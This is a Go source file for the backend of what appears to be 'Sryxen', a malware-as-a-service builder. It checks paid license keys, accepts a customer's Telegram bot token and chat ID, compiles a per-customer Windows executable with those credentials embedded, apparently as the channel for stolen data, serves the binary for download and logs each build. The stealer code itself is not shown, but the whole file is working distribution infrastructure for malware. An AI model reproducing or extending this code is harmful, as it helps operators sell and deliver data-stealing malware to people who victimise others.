package main

import (
	"crypto/rand"
	"database/sql"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"sryxen_backend/alerts"
	"sryxen_backend/auth"
	"sryxen_backend/build"
	"sryxen_backend/ratelimit"
	"sryxen_backend/structs"
	"time"

	"github.com/gorilla/mux"
	_ "github.com/mattn/go-sqlite3"
)

func initDB() (*sql.DB, error) {
	db, err := sql.Open("sqlite3", "./keys.db")
	if err != nil {
		return nil, fmt.Errorf("Failed to connect to database: %v", err)
	}

	db.SetMaxOpenConns(10)
	db.SetMaxIdleConns(5)

	_, err = db.Exec(`CREATE TABLE IF NOT EXISTS keys (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		key TEXT NOT NULL,
		status TEXT NOT NULL DEFAULT 'active',
		duration INTEGER NOT NULL,
		note TEXT,
		expires_at DATETIME NOT NULL
	)`)
	if err != nil {
		return nil, fmt.Errorf("Failed to create table: %v", err)
	}

	return db, nil
}

func main() {
	db, err := initDB()
	if err != nil {
		log.Fatalf("Failed to initialize the database: %v", err)
	}
	defer db.Close()

	if _, err := os.Stat("Sryxen.log"); os.IsNotExist(err) {
		_, err := os.Create("Sryxen.log")
		if err != nil {
			log.Fatalf("An error occurred while creating the log file: %s!\n", err)
		}
	}

	logFile, err := os.OpenFile("Sryxen.log", os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		log.Fatalf("[-] An error occurred while opening the log file: %s!\n", err)
	}
	defer logFile.Close()
	log.SetOutput(logFile)

	r := setupRouter(db)

	r.HandleFunc("/build", func(w http.ResponseWriter, r *http.Request) {
		buildHandler(w, r, db)
	}).Methods("POST")

	log.Fatal(http.ListenAndServe(":8080", ratelimit.Limit(r)))
}

func setupRouter(db *sql.DB) *mux.Router {
	router := mux.NewRouter()

	router.HandleFunc("/login", auth.LoginHandler()).Methods("GET", "POST")
	router.HandleFunc("/logout", auth.LogoutHandler()).Methods("GET")
	router.HandleFunc("/validate_key", auth.ValidateKeyHandler(db)).Methods("POST")

	adminRouter := router.PathPrefix("/admin").Subrouter()
	adminRouter.Use(auth.AuthMiddleware)
	adminRouter.HandleFunc("/dashboard", auth.ServeHTML("dashboard.html")).Methods("GET")
	adminRouter.HandleFunc("/manage_keys", auth.ServeHTML("manage_keys.html")).Methods("GET")
	adminRouter.HandleFunc("/generate", auth.GenerateKeyHandler(db)).Methods("POST")
	adminRouter.HandleFunc("/add", auth.AddKeyHandler(db)).Methods("POST")
	adminRouter.HandleFunc("/revoke", auth.RevokeKeyHandler(db)).Methods("POST")
	adminRouter.HandleFunc("/keys", auth.FetchKeysHandler(db)).Methods("GET")

	return router
}

func buildHandler(w http.ResponseWriter, r *http.Request, db *sql.DB) {
	log.Println("buildHandler called, preparing to build!") 

	log.Println("Received a request to the /build endpoint")

	var buildRequest structs.BuildRequest

	err := json.NewDecoder(r.Body).Decode(&buildRequest)
	if err != nil {
		http.Error(w, "The server failed to decode the JSON.", http.StatusBadRequest)
		log.Printf("Error occurred while decoding build request: %s\n", err)
		return
	}

	status, message := auth.IsValidLicense(db, buildRequest.License) 
	if status != "valid" {
		http.Error(w, message, http.StatusForbidden)
		log.Printf("There was an attempt to build with an invalid license: %s\n", buildRequest.License)
		return
	}

	if !auth.IsValidTelegramBotToken(buildRequest.TelegramBotToken) || !auth.IsValidTelegramChatID(buildRequest.TelegramChatID) {
		http.Error(w, "You must provide a valid Telegram bot token and chat ID.", http.StatusBadRequest)
		log.Printf("There was an attempt to build with an invalid token (%s) or chat ID (%s)\n", buildRequest.TelegramBotToken, buildRequest.TelegramChatID)
		return
	}

	uniqueID := make([]byte, 16)
	_, err = rand.Read(uniqueID)
	if err != nil {
		http.Error(w, "The server experienced an internal issue.", http.StatusInternalServerError)
		log.Printf("There was an error generating a unique ID: %s", err)
		return
	}
	uniqueIDStr := hex.EncodeToString(uniqueID)
	outputFileName := fmt.Sprintf("Built-%s.exe", uniqueIDStr)

	var randomXORKey byte
	_, err = rand.Read([]byte{randomXORKey})
	if err != nil {
		http.Error(w, "The server experienced an internal issue.", http.StatusInternalServerError)
		log.Printf("There was an error generating a random XOR key: %s", err)
		return
	}

	// Encrypt the user's credentials with the XOR key
	//rawCredentials := buildRequest.TelegramBotToken + "||" + buildRequest.TelegramChatID
	//encryptedCredentials := build.EncryptString(rawCredentials, randomXORKey)

	output, err := build.BuildBinary(buildRequest.TelegramBotToken, buildRequest.TelegramChatID, filepath.Join("./Compiled/"), outputFileName, false)
	if err != nil {
		http.Error(w, "The server experienced an internal issue.", http.StatusInternalServerError)
		log.Printf("There was an error while building the binary: %s - %s", err, output)
		return
	}
	time.Sleep(time.Millisecond * 2000)

	absPath, err := filepath.Abs(filepath.Join("./Compiled/", outputFileName))
	if err != nil {
		http.Error(w, "The server experienced an internal issue.", http.StatusInternalServerError)
		log.Printf("There was an error while resolving absolute path: %s - %s", err, output)
		return
	}

	fmt.Println(absPath)

	//output, err = build.PackBinary(absPath)
	//if err != nil {
	//	http.Error(w, "The server experienced an internal issue.", http.StatusInternalServerError)
	//	log.Printf("There was an error while packing the binary: %s - %s", err, output)
	//	return
	//}

	_, err = os.Stat(absPath)
	if err != nil {
		fmt.Println("DOESN'T FUCKING EXIST YEAH?", absPath)
		fmt.Println(err)
	}

	// Send to user
	f, err := os.Open(absPath)
	if err != nil {
		http.Error(w, "The server experienced an internal issue.", http.StatusInternalServerError)
		log.Printf("There was an error while opening the compiled binary: %s\n", err)
		return
	}

	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", f.Name()))
	io.Copy(w, f)
	log.Printf("The compiled binary was successfully sent back to the user (License is %s)\n", buildRequest.License)
	build.LogBuild(buildRequest.License, buildRequest.TelegramBotToken, buildRequest.TelegramChatID)
	alerts.BuildAlert(buildRequest.License, buildRequest.TelegramBotToken, buildRequest.TelegramChatID, r.RemoteAddr)

	f.Close()
	os.Remove(filepath.Join("./Compiled/", outputFileName))
}
